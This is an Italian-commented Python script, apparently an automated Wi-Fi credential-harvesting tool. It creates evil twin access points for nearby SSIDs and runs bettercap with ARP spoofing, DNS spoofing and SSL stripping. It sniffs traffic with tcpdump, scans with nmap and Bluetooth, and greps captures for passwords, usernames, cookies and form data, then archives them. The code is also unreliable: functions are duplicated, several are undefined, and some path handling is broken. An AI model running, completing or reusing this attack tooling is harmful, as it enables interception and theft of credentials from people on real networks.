import os
import datetime
import pkg_resources
import signal
import concurrent.futures
import zipfile
import subprocess
import shlex
import queue
import threading
import time
import re
import sys
import shutil
import psutil
from pathlib import Path
from threading import Lock



# Lock globale per la gestione concorrente dei file (se necessario)
file_lock = Lock()

def log(msg: str):
    """Log di sistema con timestamp"""
    print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}")
    sys.stdout.flush()

def run_cmd(cmd, check=True, capture_output=False, text=True, shell=False):
    """Esegue comando shell con gestione errori.
    Restituisce (stdout, stderr) se capture_output=True, altrimenti None."""
    log(f"Eseguo: {cmd}")
    try:
        if capture_output:
            result = subprocess.run(cmd, shell=shell, check=check,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=text)
            return result.stdout.strip(), result.stderr.strip()
        else:
            subprocess.run(cmd, shell=shell, check=check)
            return None, None
    except subprocess.CalledProcessError as e:
        log(f"Errore comando: {cmd}\n{e}")
        if capture_output:
            return e.stdout.strip() if e.stdout else "", e.stderr.strip() if e.stderr else ""
        if check:
            raise
        return None, None

def ensure_directory(path):
    """Crea directory se non esiste"""
    p = Path(path)
    if not p.exists():
        log(f"Creo directory: {path}")
        p.mkdir(parents=True, exist_ok=True)

def file_append_line(file_path, line):
    """Scrive una riga in append in modo thread-safe"""
    with file_lock, open(file_path, "a", encoding="utf-8") as f:
        f.write(line.rstrip("\n") + "\n")

def file_read_lines(file_path):
    """Legge tutte le righe da file. Ritorna lista vuota se file non esiste."""
    p = Path(file_path)
    if not p.exists():
        return []
    with open(file_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def file_overwrite_lines(file_path, lines):
    """Sovrascrive un file con una lista di righe"""
    with file_lock, open(file_path, "w", encoding="utf-8") as f:
        f.writelines(line.rstrip("\n") + "\n" for line in lines)

def is_root():
    """Verifica se lo script è eseguito da root"""
    return os.geteuid() == 0

def signal_handler(signum, frame):
    log(f"Segnale ricevuto: {signum}. Avvio cleanup...")
    from __main__ import cleanup  # import dinamico per evitare errori
    cleanup()

def command_exists(cmd):
    
    return shutil.which(cmd) is not None

def install_packages_apt(packages):
    
    missing = [pkg for pkg in packages if not command_exists(pkg)]
    if not missing:
        log("[✓] Tutti i pacchetti richiesti sono già installati.")
        return
    log(f"[!] Pacchetti mancanti: {missing}")
    try:
        log("[*] Aggiornamento APT...")
        run_cmd(["apt", "update", "-y"], check=True)
        for pkg in missing:
            log(f"Installazione pacchetto: {pkg}")
            run_cmd(["apt", "install", "-y", pkg], check=True)
    except Exception as e:
        log(f"[X] Errore installazione pacchetti: {e}")
        log("Procedo comunque ma alcune funzionalità potrebbero non funzionare.")

def kill_process_by_name(name):
    """Termina tutti i processi con nome contenuto in 'name' (usato per cleanup)"""
    try:
        run_cmd(["pkill", "-f", name], check=False)
    except Exception:
        pass

def zip_directory(src_dir, dest_zip):
    """Crea archivio zip della directory src_dir"""
    
    src_path = Path(src_dir)
    dest_path = Path(dest_zip)
    if not src_path.exists():
        log(f"[X] Directory da zippare non trovata: {src_dir}")
        return
    log(f"[+] Creazione archivio ZIP: {dest_zip}")
    with zipfile.ZipFile(dest_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(src_path):
            for file in files:
                file_path = Path(root) / file
                zipf.write(file_path, arcname=file_path.relative_to(src_path.parent))

def get_current_timestamp():
    """Restituisce timestamp formattato YYYY-MM-DD_HH-MM-SS"""
    return datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

# Path base per i log e sottocartelle (creati in main con timestamp)
BASE_DIR = "/tmp"
PASSWORDS_DIR = None
SCAN_DIR = None
PROBE_DIR = None
DNS_DIR = None
HTTP_DIR = None
HTTPS_DIR = None
COOKIES_DIR = None
FORMDATA_DIR = None
PHISH_DIR = None
WWW_DIR = None
PCAP_DIR = None

LOCK_FILE = "/tmp/evil_lock"
TASK_FILE = "/tmp/evil_tasks"

# Interfacce rilevate (globale)
IFACE = None          # Wifi managed interface
MON_IFACE = None      # Interface monitor (es. wlan0mon)
SUBNET = None
GATEWAY = None


def create_log_directories(base_dir):
    """Crea tutte le directory per il logging dati."""
    global PASSWORDS_DIR, SCAN_DIR, PROBE_DIR, DNS_DIR, HTTP_DIR, HTTPS_DIR
    global COOKIES_DIR, FORMDATA_DIR, PHISH_DIR, WWW_DIR, PCAP_DIR

    PASSWORDS_DIR = base_dir / "passwords"
    SCAN_DIR = base_dir / "scans"
    PROBE_DIR = base_dir / "probes"
    DNS_DIR = base_dir / "dns"
    HTTP_DIR = base_dir / "http"
    HTTPS_DIR = base_dir / "https"
    COOKIES_DIR = base_dir / "cookies"
    FORMDATA_DIR = base_dir / "formdata"
    PHISH_DIR = base_dir / "phishing"
    WWW_DIR = base_dir / "www"
    PCAP_DIR = base_dir / "pcaps"

    for d in [
        PASSWORDS_DIR, SCAN_DIR, PROBE_DIR, DNS_DIR, HTTP_DIR, HTTPS_DIR,
        COOKIES_DIR, FORMDATA_DIR, PHISH_DIR, WWW_DIR, PCAP_DIR
    ]:
        ensure_directory(d)


def get_wifi_iface():
    """Individua interfaccia Wi-Fi gestita (no monitor) con iw dev"""
    try:
        out, _ = run_cmd(["iw", "dev"], capture_output=True)
        # Parsing interfacce wireless (esclude monitor)
        lines = out.splitlines()
        interfaces = []
        for line in lines:
            line = line.strip()
            if line.startswith("Interface"):
                iface = line.split()[1]
                # Escludi monitor e virtuali
                if iface.startswith(("wl", "wlan")) and "mon" not in iface:
                    interfaces.append(iface)
        if not interfaces:
            log("[!] Nessuna interfaccia Wi-Fi gestita trovata")
            return None
        iface = interfaces[0]
        log(f"Interfaccia Wi-Fi trovata: {iface}")
        return iface
    except Exception as e:
        log(f"[X] Errore nel rilevamento interfaccia Wi-Fi: {e}")
        return None


def get_subnet_and_gateway(iface):
    """Ottiene subnet e gateway per l'interfaccia data"""
    try:
        out, _ = run_cmd(["ip", "-o", "-f", "inet", "addr", "show", iface], capture_output=True)
        # ip -o -f inet addr show wlan0
        # 3: wlan0    inet 192.168.1.100/24 brd 192.168.1.255 scope global dynamic wlan0
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 4 and parts[2] == "inet":
                subnet = parts[3]
                break
        else:
            subnet = None
        if subnet is None:
            log(f"[!] Non riesco a ottenere la subnet per {iface}")
            return None, None

        out, _ = run_cmd(["ip", "route"], capture_output=True)
        gateway = None
        for line in out.splitlines():
            if line.startswith("default") and iface in line:
                # default via 192.168.1.1 dev wlan0 proto dhcp metric 600
                parts = line.split()
                if "via" in parts:
                    gw_index = parts.index("via") + 1
                    gateway = parts[gw_index]
                    break
        if gateway is None:
            log(f"[!] Non riesco a ottenere il gateway per {iface}")

        log(f"Subnet: {subnet}, Gateway: {gateway}")
        return subnet, gateway
    except Exception as e:
        log(f"[X] Errore nel recupero subnet e gateway: {e}")
        return None, None


def scan_wifi_networks(scan_dir):
    """
    Scansione reti Wi-Fi con vari metodi: iwlist, iw dev, nmcli.
    Salva gli SSID in scans/essids.txt
    """
    ensure_directory(scan_dir)
    essids_file = scan_dir / "essids.txt"
    essids = set()

    def scan_with_iwlist(iface):
        log(f"[+] Scansione reti con iwlist su {iface}")
        try:
            out, _ = run_cmd(["timeout", "15s", "iwlist", iface, "scan"], capture_output=True)
            for line in out.splitlines():
                if "ESSID:" in line:
                    # ESSID:"MyWiFi"
                    start = line.find('"')
                    end = line.rfind('"')
                    if start != -1 and end != -1 and end > start:
                        ssid = line[start+1:end].strip()
                        if ssid:
                            essids.add(ssid)
            if essids:
                log(f"SSID trovati (iwlist): {essids}")
                return True
            else:
                log("[!] Nessun SSID trovato con iwlist")
                return False
        except Exception as e:
            log(f"[X] Errore iwlist scan: {e}")
            return False

    def scan_with_iwdev(iface):
        log(f"[+] Scansione reti con iw dev su {iface}")
        try:
            out, _ = run_cmd(["timeout", "15s", "iw", "dev", iface, "scan"], capture_output=True)
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("SSID:"):
                    ssid = line[len("SSID:"):].strip()
                    if ssid:
                        essids.add(ssid)
            if essids:
                log(f"SSID trovati (iw dev): {essids}")
                return True
            else:
                log("[!] Nessun SSID trovato con iw dev")
                return False
        except Exception as e:
            log(f"[X] Errore iw dev scan: {e}")
            return False

    def scan_with_nmcli():
        log("[+] Scansione reti con nmcli")
        try:
            out, _ = run_cmd(["nmcli", "dev", "wifi", "list"], capture_output=True)
            for line in out.splitlines()[1:]:
                # formato colonna essid: seconda colonna
                parts = line.split()
                if len(parts) > 1:
                    ssid = parts[1]
                    if ssid != "--" and ssid != "":
                        essids.add(ssid)
            if essids:
                log(f"SSID trovati (nmcli): {essids}")
                return True
            else:
                log("[!] Nessun SSID trovato con nmcli")
                return False
        except Exception as e:
            log(f"[X] Errore nmcli scan: {e}")
            return False

    # Prova con iwlist
    if IFACE and scan_with_iwlist(IFACE):
        pass
    # Fallback iw dev
    elif IFACE and scan_with_iwdev(IFACE):
        pass
    # Fallback nmcli
    else:
        scan_with_nmcli()

    # Salvo gli SSID ordinati e unici
    essids_list = sorted(essids)
    file_overwrite_lines(essids_file, essids_list)
    log(f"SSID salvati in {essids_file}")



def enable_monitor_mode() -> str | None:
    
    global MON_IFACE, IFACE

    if not IFACE:
        log("[X] Interfaccia Wi-Fi non impostata, impossibile abilitare modalità monitor.")
        return None

    try:
        # Verifica se monitor mode è già attivo
        iw_dev_output = subprocess.check_output(["iw", "dev"], text=True)
        for line in iw_dev_output.splitlines():
            if "Interface" in line and f"{IFACE}mon" in line:
                MON_IFACE = f"{IFACE}mon"
                log(f"[*] Modalità monitor già attiva su {MON_IFACE}")
                return MON_IFACE

        # Kill processi che possono interferire con airmon-ng
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Avvia monitor mode
        proc = subprocess.run(["airmon-ng", "start", IFACE], capture_output=True, text=True)
        output = proc.stdout + proc.stderr

        # Cerca interfaccia monitor creata
        mon_iface = None
        for line in output.splitlines():
            if "monitor mode enabled on" in line:
                mon_iface = line.split()[-1]
                break

        if mon_iface:
            MON_IFACE = mon_iface
            log(f"[*] Modalità monitor attivata su {MON_IFACE}")
            time.sleep(2)  # pausa per stabilità
            return MON_IFACE
        else:
            log("[!] Non sono riuscito a determinare l'interfaccia monitor dopo airmon-ng.")
            return None

    except subprocess.CalledProcessError as e:
        log(f"[X] Errore subprocess abilitazione monitor mode: {e}")
        return None
    except Exception as e:
        log(f"[X] Errore inatteso abilitazione monitor mode: {e}")
        return None


def start_evil_twin(ssid):
    """
    Avvia Evil Twin clonato di uno SSID.
    Usa airbase-ng con interfaccia MON_IFACE, apre dhcp/dns tramite dnsmasq,
    configura iptables per NAT.
    """
    
    if not MON_IFACE:
        log("[X] Modalità monitor non abilitata, impossibile avviare Evil Twin.")
        return False
    try:
        log(f"[*] Avvio Evil Twin per SSID: {ssid}")

        # Trova canale del SSID tramite iwlist
        proc = subprocess.run(["iwlist", IFACE, "scan"], capture_output=True, text=True)
        channel = "6"  # default
        lines = proc.stdout.splitlines()
        for i, line in enumerate(lines):
            if f'ESSID:"{ssid}"' in line:
                # Canale lo trovi due righe sotto (tipico formato iwlist)
                if i+2 < len(lines):
                    chan_line = lines[i+2].strip()
                    if "Channel:" in chan_line:
                        channel = chan_line.split(":")[1].strip()
                break

        # Start airbase-ng (finto AP)
        airbase_log = BASE_DIR / f"airbase_{ssid.replace(' ', '_')}.log"
        airbase_cmd = ["airbase-ng", "-e", ssid, "-c", channel, MON_IFACE]
        airbase_proc = subprocess.Popen(airbase_cmd, stdout=open(airbase_log, "w"), stderr=subprocess.STDOUT)
        time.sleep(5)  # aspetta creazione interfaccia atX

        # Trova interfaccia atX nuova (ipotizziamo ip link show)
        proc = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
        at_interfaces = [line.split(":")[1].strip() for line in proc.stdout.splitlines() if "at" in line]
        if not at_interfaces:
            log("[!] Non ho trovato interfacce atX dopo airbase-ng")
            return False
        new_iface = at_interfaces[-1]  # presumiamo ultima creata

        # Configura interfaccia atX
        subprocess.run(["ip", "link", "set", new_iface, "up"])
        subprocess.run(["ip", "addr", "add", f"{GATEWAY}/24", "dev", new_iface])

        # Abilita forwarding IP
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)

        # Setup iptables per NAT
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", IFACE, "-j", "MASQUERADE"])
        subprocess.run(["iptables", "-A", "FORWARD", "-i", IFACE, "-o", new_iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
        subprocess.run(["iptables", "-A", "FORWARD", "-i", new_iface, "-o", IFACE, "-j", "ACCEPT"])

        # Avvia dnsmasq per DHCP e DNS finti
        dnsmasq_log = BASE_DIR / f"dnsmasq_{ssid.replace(' ', '_')}.log"
        dnsmasq_cmd = [
            "dnsmasq",
            "--no-daemon",
            f"--interface={new_iface}",
            "--bind-interfaces",
            "--except-interface=lo",
            f"--dhcp-range={GATEWAY},192.168.20.200,255.255.255.0,12h",
            f"--dhcp-option=3,{GATEWAY}",
            f"--dhcp-option=6,{GATEWAY}",
            f"--address=/#/{GATEWAY}"
        ]
        dnsmasq_proc = subprocess.Popen(dnsmasq_cmd, stdout=open(dnsmasq_log, "w"), stderr=subprocess.STDOUT)

        log(f"[*] Evil Twin avviato su {new_iface} (SSID: {ssid})")
        return True
    except Exception as e:
        log(f"[X] Errore avvio Evil Twin: {e}")
        return False


def start_bettercap():
    """
    Avvia bettercap su interfaccia at0.
    Configurazione base: arp spoof, sniffing, dns spoof, sslstrip, proxy http.
    Log salvato in bettercap.log
    """
    try:
        log("[*] Avvio Bettercap su at0")
        bettercap_log = BASE_DIR / "bettercap.log"
        bettercap_cmd = [
            "bettercap", "-iface", "at0", "-eval",
            "set net.sniff.output " + str(PCAP_DIR / "sniff.pcap") + "; "
            "set arp.spoof.fullduplex true; "
            "set net.sniff.verbose true; "
            "set dns.spoof.all true; "
            "set proxy.http.sslstrip true; "
            "net.recon on; arp.spoof on; net.sniff on; proxy.http on;"
        ]
        subprocess.Popen(bettercap_cmd, stdout=open(bettercap_log, "w"), stderr=subprocess.STDOUT)
        return True
    except Exception as e:
        log(f"[X] Errore avvio Bettercap: {e}")
        return False


def start_tcpdump():
    """
    Avvia tcpdump su interfaccia at0 salvando raw.pcap.
    """
    try:
        log("[*] Avvio TCPDump su at0")
        tcpdump_log = PCAP_DIR / "raw.pcap"
        tcpdump_cmd = ["tcpdump", "-i", "at0", "-w", str(tcpdump_log)]
        subprocess.Popen(tcpdump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        log(f"[X] Errore avvio TCPDump: {e}")
        return False


def start_nmap():
    """
    Esegue scansione SYN stealth sulla subnet e salva log.
    """
    try:
        log("[*] Avvio scansione Nmap")
        nmap_log = SCAN_DIR / "nmap.log"
        subprocess.run(["nmap", "-sS", "-T4", SUBNET, "-oN", str(nmap_log)])
        return True
    except Exception as e:
        log(f"[X] Errore esecuzione Nmap: {e}")
        return False


def start_bluetooth_scan():
    """
    Esegue scansione dispositivi Bluetooth con hcitool.
    """
    try:
        log("[*] Avvio scansione Bluetooth")
        bt_log = SCAN_DIR / "bluetooth.log"
        out = subprocess.run(["hcitool", "scan"], capture_output=True, text=True)
        file_write(bt_log, out.stdout)
        return True
    except Exception as e:
        log(f"[X] Errore scansione Bluetooth: {e}")
        return False


def start_probe_sniffing():
        
    try:
        log("[*] Avvio sniffing Probe Requests")
        probes_log = PROBE_DIR / "probes.log"
        tcpdump_cmd = f"tcpdump -i {MON_IFACE} type mgt subtype probe-req -l"
        proc = subprocess.Popen(shlex.split(tcpdump_cmd), stdout=open(probes_log, "w"), stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        log(f"[X] Errore sniffing Probe Requests: {e}")
        return False


def extract_credentials():
    """
    Estrae password, username, cookies e form-data da pcap sniff.pcap.
    Salva in file separati.
    """
    try:
        log("[*] Estrazione dati credenziali e cookies")
        pcap_path = PCAP_DIR / "sniff.pcap"
        if not pcap_path.exists():
            log("[!] File pcap sniff.pcap non trovato, impossibile estrarre dati")
            return False

        # Uso 'strings' per estrazione semplice (potrebbe richiedere tcpdump/wireshark/tshark per parsing profondo)
        # Passwords
        pw_file = PASSWORDS_DIR / "passwords.log"
        grep_pw = "pass=|password=|pwd=|passwd="
        _grep_pcap_to_file(pcap_path, grep_pw, pw_file)

        # Usernames
        user_file = PASSWORDS_DIR / "usernames.log"
        grep_user = "user=|username=|login="
        _grep_pcap_to_file(pcap_path, grep_user, user_file)

        # Cookies
        cookies_file = COOKIES_DIR / "cookies.log"
        grep_cookie = "Cookie: "
        _grep_pcap_to_file(pcap_path, grep_cookie, cookies_file, case_insensitive=True)

        # Form data
        form_file = FORMDATA_DIR / "formdata.log"
        # Cerca Content-Type e campi vari (semplice grep multilinea)
        formdata_cmd = (
            f"strings {pcap_path} | grep -Ei 'Content-Type: application/x-www-form-urlencoded' -A10 | "
            "grep -E '[a-zA-Z0-9_]+=.*' | sort | uniq"
        )
        out, _ = run_cmd(["bash", "-c", formdata_cmd], capture_output=True)
        file_write(form_file, out.strip())

        return True
    except Exception as e:
        log(f"[X] Errore estrazione credenziali: {e}")
        return False


def _grep_pcap_to_file(pcap_path, pattern, output_file, case_insensitive=False):
    """Helper che esegue grep da strings sul file pcap e salva risultati ordinati unici."""
    ci_flag = "-i" if case_insensitive else ""
    cmd = f"strings {pcap_path} | grep {ci_flag} -E '{pattern}' | sort | uniq"
    try:
        out, _ = run_cmd(["bash", "-c", cmd], capture_output=True)
        file_write(output_file, out.strip())
    except Exception as e:
        log(f"[X] Errore grep pcap ({pattern}): {e}")


def sort_and_archive_logs():
    """
    Ordina query DNS, richieste HTTP, metadati HTTPS e archivia i log in zip.
    """
    
    try:
        log("[*] Ordinamento e archiviazione logs")

        # DNS queries
        dns_file = DNS_DIR / "queries.log"
        _grep_pcap_to_file(PCAP_DIR / "sniff.pcap", r"\.com|\.net|\.org", dns_file)

        # HTTP requests
        http_file = HTTP_DIR / "http_requests.log"
        _grep_pcap_to_file(PCAP_DIR / "sniff.pcap", r"GET /|POST /|Host: ", http_file)

        # HTTPS metadata
        https_file = HTTPS_DIR / "https_info.log"
        _grep_pcap_to_file(PCAP_DIR / "sniff.pcap", r"TLS|SSL|Server Name", https_file)

        # Zip l'intera cartella base
        zip_path = BASE_DIR.with_suffix(".zip")
        with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            for foldername, _, filenames in os.walk(BASE_DIR):
                for filename in filenames:
                    filepath = os.path.join(foldername, filename)
                    arcname = os.path.relpath(filepath, BASE_DIR)
                    zf.write(filepath, arcname)

        log(f"[*] Logs archiviati in {zip_path}")
        return True
    except Exception as e:
        log(f"[X] Errore archiviazione logs: {e}")
        return False

# Coda globale task (modulare)
task_queue = queue.Queue()

# Flag di esecuzione per i thread
running = True

def signal_handler(sig, frame):
    """
    Gestore segnale SIGINT (Ctrl+C).
    Pulisce iptables, disattiva monitor mode, riporta interfaccia Wi-Fi in stato normale,
    termina i processi figli in modo ordinato, esce con codice 0.
    """
    global running
    log("[!] Segnale SIGINT ricevuto. Pulizia in corso...")
    running = False
    cleanup()
    sys.exit(0)


def cleanup():
    """
    Ripristina configurazioni di rete, pulisce iptables e ferma processi figli.
    """
    

    # Disabilita forwarding IP
    run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=0"])

    # Pulisce regole iptables (ATTENZIONE: rimuove solo quelle aggiunte)
    run_cmd(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", IFACE, "-j", "MASQUERADE"], check=False)
    run_cmd(["iptables", "-D", "FORWARD", "-i", IFACE, "-o", "at0", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], check=False)
    run_cmd(["iptables", "-D", "FORWARD", "-i", "at0", "-o", IFACE, "-j", "ACCEPT"], check=False)

    # Arresta airbase-ng, dnsmasq, bettercap, tcpdump
    for proc_name in ["airbase-ng", "dnsmasq", "bettercap", "tcpdump"]:
        for proc in psutil.process_iter():
            try:
                if proc_name in proc.name():
                    proc.kill()
                    log(f"[*] Processo {proc_name} terminato.")
            except Exception:
                continue

    # Disattiva monitor mode: ferma airmon-ng su MON_IFACE
    if MON_IFACE:
        run_cmd(["airmon-ng", "stop", MON_IFACE])

    # Riporta IFACE UP e resetta (opzionale)
    run_cmd(["ip", "link", "set", IFACE, "up"])

    log("[*] Pulizia completata, rete ripristinata.")


def worker():
    """
    Thread worker che estrae funzioni dalla coda e le esegue finché running è True.
    """
    while running:
        try:
            func, args = task_queue.get(timeout=1)
            func(*args)
            task_queue.task_done()
        except queue.Empty:
            continue
        except Exception as e:
            log(f"[X] Errore thread worker: {e}")


def start_threads(num_threads=4):
    """
    Avvia n thread worker e li tiene in esecuzione.
    """
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    return threads


def launch_tmux_session(session_name="net_harvester"):
    """
    Avvia sessione tmux in modo resiliente:
    - Se esiste, allega
    - Se non esiste, crea con schermo diviso per 4 terminali (log, sniff, evil twin, nmap)
    """
    try:
        # Controlla se sessione esiste
        proc = subprocess.run(["tmux", "has-session", "-t", session_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if proc.returncode == 0:
            log(f"[*] Sessione tmux {session_name} esistente, allego...")
            subprocess.run(["tmux", "attach-session", "-t", session_name])
            return True
        else:
            # Crea sessione nuova con layout 2x2
            subprocess.run(["tmux", "new-session", "-d", "-s", session_name])
            # Splitta finestre
            subprocess.run(["tmux", "split-window", "-h", "-t", session_name])
            subprocess.run(["tmux", "split-window", "-v", "-t", f"{session_name}:0.0"])
            subprocess.run(["tmux", "split-window", "-v", "-t", f"{session_name}:0.1"])
            # Disposizione
            subprocess.run(["tmux", "select-layout", "-t", session_name, "tiled"])

            # Esegui comandi in ciascun pane
            cmds = [
                f"tail -f {BASE_DIR}/logs/general.log",  # Pane 0: log generale
                f"tcpdump -i {MON_IFACE}",              # Pane 1: sniffing tcpdump
                "top",                                 # Pane 2: monitoraggio risorse
                f"nmap -sS {SUBNET} -oN {SCAN_DIR}/nmap.log",  # Pane 3: nmap scansione
            ]

            for i, cmd in enumerate(cmds):
                subprocess.run(["tmux", "send-keys", "-t", f"{session_name}:0.{i}", cmd, "Enter"])

            # Allegati alla sessione
            subprocess.run(["tmux", "attach-session", "-t", session_name])
            return True
    except Exception as e:
        log(f"[X] Errore avvio sessione tmux: {e}")
        return False

REQUIRED_PACKAGES = [
    "aircrack-ng", "bettercap", "dnsmasq", "tcpdump", "tmux",
    "nmap", "bluetoothctl", "macchanger", "zip", "busybox",
    "lighttpd", "htop", "multitail", "iw", "iproute2", "python3-pip"
]

PYTHON_DEPENDENCIES = [
    "psutil"
]

def log(msg: str):
    """
    Log con timestamp e scrittura su stdout + file log generale.
    """
    timestamp = datetime.datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    formatted = f"[{timestamp}] {msg}"
    print(formatted)
    with open(f"{BASE_DIR}/logs/general.log", "a") as f:
        f.write(formatted + "\n")


def check_and_install_system_packages():
    """
    Verifica la presenza di tool di sistema, li installa automaticamente con apt se mancano.
    """
    missing = []
    for pkg in REQUIRED_PACKAGES:
        if shutil.which(pkg) is None:
            missing.append(pkg)

    if missing:
        log(f"[!] Pacchetti mancanti: {missing}. Installo automaticamente...")
        try:
            subprocess.run(["apt", "update"], check=True)
            subprocess.run(["apt", "install", "-y"] + missing, check=True)
            log("[✓] Installazione pacchetti completata.")
        except subprocess.CalledProcessError:
            log("[X] Errore durante installazione pacchetti. Verificare manualmente.")
            sys.exit(1)
    else:
        log("[✓] Tutti i pacchetti di sistema sono installati.")


def check_and_install_python_packages():
    """
    Installa pacchetti python richiesti tramite pip (es. psutil).
    """
    
    installed = {pkg.key for pkg in pkg_resources.working_set}
    to_install = [pkg for pkg in PYTHON_DEPENDENCIES if pkg not in installed]

    if to_install:
        log(f"[!] Pacchetti Python mancanti: {to_install}. Installo automaticamente...")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install"] + to_install, check=True)
            log("[✓] Installazione pacchetti Python completata.")
        except subprocess.CalledProcessError:
            log("[X] Errore durante installazione pacchetti Python.")
            sys.exit(1)
    else:
        log("[✓] Tutti i pacchetti Python sono installati.")


def prepare_directories():
    """
    Crea tutte le directory necessarie con controllo esistenza.
    """
    dirs = [
        BASE_DIR,
        os.path.join(BASE_DIR, "passwords"),
        os.path.join(BASE_DIR, "scans"),
        os.path.join(BASE_DIR, "probes"),
        os.path.join(BASE_DIR, "dns"),
        os.path.join(BASE_DIR, "http"),
        os.path.join(BASE_DIR, "https"),
        os.path.join(BASE_DIR, "cookies"),
        os.path.join(BASE_DIR, "formdata"),
        os.path.join(BASE_DIR, "pcaps"),
        os.path.join(BASE_DIR, "phishing"),
        os.path.join(BASE_DIR, "www"),
        os.path.join(BASE_DIR, "logs"),
    ]
    for d in dirs:
        if not os.path.exists(d):
            os.makedirs(d, exist_ok=True)
            log(f"[*] Creata directory: {d}")


def check_root():
    """
    Controlla se lo script è eseguito con permessi root. Esce se no.
    """
    if os.geteuid() != 0:
        log("[X] Eseguire come root (sudo).")
        sys.exit(1)


def check_wifi_interface():
    """
    Verifica se è presente un'interfaccia Wi-Fi valida.
    """
    global IFACE
    try:
        output = subprocess.check_output(["iw", "dev"]).decode()
        lines = output.splitlines()
        interfaces = [line.strip().split()[-1] for line in lines if line.strip().startswith("Interface")]
        wifi_ifaces = [iface for iface in interfaces if iface.startswith("wl") or iface.startswith("wlan")]
        if not wifi_ifaces:
            log("[X] Nessuna interfaccia wireless trovata (wl* o wlan*).")
            sys.exit(1)
        IFACE = wifi_ifaces[0]
        log(f"[*] Interfaccia Wi-Fi selezionata: {IFACE}")
    except Exception as e:
        log(f"[X] Errore durante rilevamento interfaccia Wi-Fi: {e}")
        sys.exit(1)


def get_network_info():
    """
    Imposta variabili globali: SUBNET, GATEWAY.
    """
    global SUBNET, GATEWAY
    try:
        ip_out = subprocess.check_output(["ip", "-o", "-f", "inet", "addr", "show", IFACE]).decode()
        SUBNET = ip_out.strip().split()[-1]
        route_out = subprocess.check_output(["ip", "route"]).decode()
        for line in route_out.splitlines():
            if line.startswith("default"):
                GATEWAY = line.split()[2]
                break
        log(f"[*] Subnet: {SUBNET} - Gateway: {GATEWAY}")
    except Exception as e:
        log(f"[X] Errore nel recupero subnet/gateway: {e}")
        sys.exit(1)


def unblock_rfkill():
    """
    Sblocca eventuali blocchi RF.
    """
    try:
        subprocess.run(["rfkill", "unblock", "all"], check=True)
        log("[*] RFKill unblock eseguito.")
    except Exception as e:
        log(f"[!] Errore durante unblock rfkill: {e}")


# Variabili globali per task queue e lock
TASK_QUEUE = queue.Queue()
TASK_LOCK = threading.Lock()

def scan_wifi_networks():
    """
    Scansione Wi-Fi con più metodi (iwlist, iw, nmcli),
    scrive lista SSID univoci su scans/essids.txt
    """
    log("[*] Scansione reti Wi-Fi in corso...")

    essids = set()

    # Metodo 1: iwlist scan
    try:
        result = subprocess.run(["iwlist", IFACE, "scan"], capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            matches = re.findall(r'ESSID:"([^"]+)"', result.stdout)
            essids.update(filter(None, matches))
            if essids:
                log(f"[*] SSID trovati con iwlist: {essids}")
    except Exception as e:
        log(f"[!] iwlist scan fallito: {e}")

    # Metodo 2: iw dev scan
    if not essids:
        try:
            result = subprocess.run(["iw", "dev", IFACE, "scan"], capture_output=True, text=True, timeout=15)
            if result.returncode == 0:
                matches = re.findall(r'SSID: (.+)', result.stdout)
                essids.update(filter(None, matches))
                if essids:
                    log(f"[*] SSID trovati con iw dev scan: {essids}")
        except Exception as e:
            log(f"[!] iw dev scan fallito: {e}")

    # Metodo 3: nmcli dev wifi list
    if not essids:
        try:
            result = subprocess.run(["nmcli", "dev", "wifi", "list"], capture_output=True, text=True)
            if result.returncode == 0:
                lines = result.stdout.strip().splitlines()[1:]  # Skip header
                for line in lines:
                    cols = line.split()
                    if len(cols) >= 2:
                        ssid = cols[1]
                        if ssid and ssid != "--":
                            essids.add(ssid)
                if essids:
                    log(f"[*] SSID trovati con nmcli: {essids}")
        except Exception as e:
            log(f"[!] nmcli scan fallito: {e}")

    # Scrivo gli SSID ordinati su file
    essids_file = os.path.join(BASE_DIR, "scans", "essids.txt")
    with open(essids_file, "w") as f:
        for ssid in sorted(essids):
            f.write(ssid + "\n")

    if not essids:
        log("[!] Nessuna rete Wi-Fi trovata.")
    else:
        log(f"[*] Totale reti trovate: {len(essids)}")

    return essids




def enqueue_tasks(essids: set):
    """
    Inserisce nella coda TASK_QUEUE i task da eseguire, compresi i clone Evil Twin per ogni SSID.
    """
    log("[*] Inserimento task nella coda di esecuzione")

    # Task base
    TASK_QUEUE.put(change_mac_loop)
    TASK_QUEUE.put(create_fake_portal)  # funzione da implementare

    # Evil Twin per ogni SSID
    for ssid in essids:
        TASK_QUEUE.put(lambda ssid=ssid: start_evil_twin(ssid))

    # Task di sniffing e raccolta dati
    TASK_QUEUE.put(start_bettercap)
    TASK_QUEUE.put(start_tcpdump)
    TASK_QUEUE.put(start_nmap)
    TASK_QUEUE.put(start_bluetooth_scan)
    TASK_QUEUE.put(start_probe_sniffing)
    TASK_QUEUE.put(extract_passwords)
    TASK_QUEUE.put(extract_usernames)
    TASK_QUEUE.put(extract_cookies)
    TASK_QUEUE.put(extract_formdata)
    TASK_QUEUE.put(harvest_phishing_data)
    TASK_QUEUE.put(sort_dns_queries)
    TASK_QUEUE.put(sort_http_requests)
